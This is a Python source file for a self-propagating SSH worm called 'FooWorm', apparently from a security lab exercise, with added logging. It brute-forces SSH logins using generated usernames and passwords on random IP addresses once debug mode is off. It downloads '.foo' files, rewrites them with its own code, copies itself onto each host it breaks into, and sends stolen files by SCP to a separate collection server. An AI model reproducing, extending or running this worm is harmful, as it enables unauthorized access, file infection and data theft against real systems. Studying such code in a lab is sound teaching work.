#!/usr/bin/env python3
import sys
import os
import random
import signal
import paramiko
import scp
import logging # Added
import argparse # Added
from log_config import setup_logging # Added

# --- Argument Parsing ---
parser = argparse.ArgumentParser(description="FooWorm file infection and propagation script.")
parser.add_argument(
    '--log-level',
    choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
    default='INFO',
    help='Set the logging level (default: INFO)'
)
args = parser.parse_args()

# --- Configure Logging ---
setup_logging(args.log_level)

# --- Get Logger for this Module ---
logger = logging.getLogger(__name__)

# --- Existing Code Starts Here ---

# Signal handler setup
def sig_handler(signum, frame): os.kill(os.getpid(), signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1 # IMPORTANT: Remains for debugging logic
NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['seed']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['dees']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x: random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['10.0.2.10', '10.0.2.11']
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses

while True:
    logger.info("Starting main loop")
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)
    logger.debug(f"Generated usernames: {usernames}")
    logger.debug(f"Generated passwords: {passwds}")

    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                logger.info(f"Trying connection: user={user} host={ip_address}")
                files_of_interest_at_target = []
                ssh = None

                try:
                    logger.debug("Establishing SSH connection")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                    logger.info(f"SSH connection established: user={user} host={ip_address}")

                    # Check if already infected
                    logger.debug(f"Running initial 'ls' command on host={ip_address}")
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        logger.warning(f"Error executing 'ls' on host={ip_address}: {''.join(error)}")
                        # Don't necessarily continue; maybe the worm isn't there yet

                    received_list = list(map(lambda x: x.encode('utf-8').strip(), stdout.readlines())) # Decode and strip
                    logger.debug(f"Output of 'ls' on host={ip_address}: {received_list}")

                    # Check if 'FooWorm.py' exists
                    worm_present = any(b'FooWorm.py' in item for item in received_list)
                    if worm_present:
                        logger.info(f"Target host={ip_address} already infected, skipping.")
                        ssh.close()
                        continue

                    # Find .foo files
                    logger.debug(f"Looking for .foo files on host={ip_address}")
                    cmd = 'ls *.foo 2>/dev/null' # Simpler command
                    stdin, stdout, stderr = ssh.exec_command(cmd)

                    error = stderr.readlines()
                    if error:
                        logger.warning(f"Error finding .foo files on host={ip_address}: {''.join(error)}")

                    received_list = list(map(lambda x: x.strip(), stdout.readlines())) # Already strings
                    logger.debug(f"Found potential .foo files on host={ip_address}: {received_list}")

                    # Filter results - 'ls' returns filenames directly
                    files_of_interest_at_target = [f for f in received_list if f and f.endswith('.foo')]

                    if not files_of_interest_at_target:
                        logger.info(f"No .foo files found on host={ip_address}")
                    else:
                         logger.info(f"Found files of interest on host={ip_address}: {files_of_interest_at_target}")

                    # Read self-code for infection payload
                    logger.debug("Reading self-code for infection payload")
                    try:
                        with open(sys.argv[0],'r') as IN:
                            lines = IN.readlines()
                        # Keep only the essential part of the worm for propagation
                        # Be careful with line counts, ensure it includes necessary logic
                        virus = [line for (i, line) in enumerate(lines) if i < 150] # Adjust line count as needed
                        logger.debug(f"Read {len(virus)} lines for payload")
                    except Exception as e_read_self:
                        logger.exception("Failed to read self-code. Cannot proceed with infection.")
                        ssh.close()
                        continue # Skip this target if self-code reading fails

                    # Initialize SCP Client
                    logger.debug(f"Setting up SCP connection for host={ip_address}")
                    scpcon = scp.SCPClient(ssh.get_transport())

                    if files_of_interest_at_target:
                        logger.info(f"Exfiltrating {len(files_of_interest_at_target)} file(s) from host={ip_address}")
                        for target_file in files_of_interest_at_target:
                            try:
                                logger.debug(f"Exfiltrating file={target_file} from host={ip_address}")
                                scpcon.get(target_file)
                                logger.info(f"Exfiltrated file={target_file} successfully")
                            except Exception as e_scp_get:
                                logger.error(f"SCP Exfiltration failed for file={target_file} on host={ip_address}: {e_scp_get}")
                                # Decide if you want to continue infecting other files or stop

                        logger.info(f"Starting infection process for files on host={ip_address}")
                        try:
                            for target_file in files_of_interest_at_target:
                                local_target_file = target_file # Assumes downloaded to current dir
                                logger.debug(f"Processing local file: {local_target_file}")
                                try:
                                    with open(local_target_file, 'r') as IN:
                                        all_of_it = IN.readlines()
                                except Exception as e_read_local:
                                     logger.error(f"Failed to read local file {local_target_file}: {e_read_local}. Skipping infection for this file.")
                                     continue

                                # Check if already infected by looking for a specific marker
                                if not any('# FooWorm Infection Marker' in line for line in all_of_it):
                                    logger.info(f"Infecting file: {local_target_file}")
                                    try:
                                        with open(local_target_file, 'w') as OUT:
                                            OUT.write("# FooWorm Infection Marker\n") # Add a marker
                                            OUT.writelines(virus)
                                            # Comment out original content - ensure proper commenting
                                            all_of_it_commented = ['# ' + line.lstrip('#').strip() + '\n' for line in all_of_it]
                                            OUT.writelines(all_of_it_commented)

                                        # Upload infected file back
                                        logger.info(f"Uploading infected file={target_file} back to host={ip_address}")
                                        scpcon.put(local_target_file, target_file)
                                        logger.info(f"Uploaded infected file={target_file}")
                                    except Exception as e_infect_upload:
                                        logger.exception(f"Failed to infect or upload {target_file} on host={ip_address}")
                                else:
                                    logger.info(f"File {target_file} on host={ip_address} already appears infected. Skipping.")

                        except Exception as e_infect_loop:
                            logger.exception(f"Error during infection loop for host={ip_address}")

                    # Always try to upload the worm itself
                    logger.info(f"Uploading FooWorm.py to host={ip_address}")
                    try:
                        scpcon.put(sys.argv[0], 'FooWorm.py') # Upload self as FooWorm.py
                        logger.info(f"Worm uploaded successfully to host={ip_address}")
                    except Exception as e_scp_put_self:
                        logger.error(f"Failed to upload worm to host={ip_address}: {e_scp_put_self}")

                    # Close SCP connection
                    logger.debug(f"Closing SCP connection for host={ip_address}")
                    scpcon.close()

                except paramiko.AuthenticationException:
                    logger.warning(f"Authentication failed for user={user} on host={ip_address}")
                except Exception as e_main:
                    logger.exception(f"Connection or main operation failed for user={user} host={ip_address}")
                finally:
                    if ssh:
                        try:
                            ssh.close()
                            logger.debug(f"Closed SSH connection for host={ip_address}")
                        except Exception as e_close:
                            logger.error(f"Failed to close SSH connection for host={ip_address}: {e_close}")
                    # Continue to the next IP address regardless of success or failure here

                # Exfiltration Logic (if files were successfully downloaded)
                # Note: This logic depends on the files existing locally after the SCP get
                if files_of_interest_at_target:
                    logger.info(f"Attempting exfiltration of {len(files_of_interest_at_target)} files obtained from host={ip_address}")
                    ssh_exfil = None
                    try:
                        ssh_exfil = paramiko.SSHClient()
                        ssh_exfil.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        exfil_host = '10.0.2.9'
                        exfil_user = 'seed'
                        exfil_pass = 'dees' # Consider safer methods
                        logger.info(f"Connecting to exfiltration server host={exfil_host}")
                        ssh_exfil.connect(exfil_host, port=22, username=exfil_user, password=exfil_pass, timeout=5)
                        scpcon_exfil = scp.SCPClient(ssh_exfil.get_transport())
                        logger.info(f"Connected to exfiltration server host={exfil_host}")

                        for filename in files_of_interest_at_target:
                            local_filepath = filename # Assumes file is in current directory
                            if os.path.exists(local_filepath):
                                logger.info(f"Exfiltrating file={local_filepath} to host={exfil_host}")
                                try:
                                    scpcon_exfil.put(local_filepath)
                                    logger.info(f"Exfiltrated file={local_filepath} successfully")
                                except Exception as e_exfil_put:
                                    logger.error(f"Failed to exfiltrate file={local_filepath}: {e_exfil_put}")
                            else:
                                logger.warning(f"Local file {local_filepath} not found for exfiltration. Was it downloaded?")

                        scpcon_exfil.close()
                        logger.info(f"Exfiltration process complete for files from host={ip_address}")
                    except Exception as e_exfil_main:
                        logger.exception(f"Exfiltration connection or process failed")
                    finally:
                        if ssh_exfil:
                            try:
                                ssh_exfil.close()
                                logger.debug("Closed exfiltration SSH connection.")
                            except Exception as e_close_exfil:
                                logger.error(f"Failed to close exfiltration SSH connection: {e_close_exfil}")

    if debug:
        logger.info("Debug mode enabled - exiting after one full iteration.")
        break